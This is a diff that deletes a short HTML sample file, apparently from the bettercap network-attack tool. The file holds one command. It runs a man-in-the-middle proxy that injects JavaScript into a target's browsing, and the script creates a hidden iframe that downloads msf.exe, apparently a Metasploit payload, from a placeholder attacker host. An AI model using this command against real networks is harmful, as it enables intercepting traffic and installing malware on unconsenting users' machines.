@@ -1,6 +1,0 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>Sample injectjs Data</title>
-</head><body># bettercap -T &lt;target&gt; --proxy-module injectjs --no-sslstrip --httpd --httpd-port 8081 --httpd-path . --js-data 'function onl() { var iframe = document.createElement("iframe"); iframe.style.display = "none"; iframe.src = "http://&lt;attacker&gt;:8081/msf.exe"; document.body.appendChild(iframe); } window.onload = onl;'</body></html>
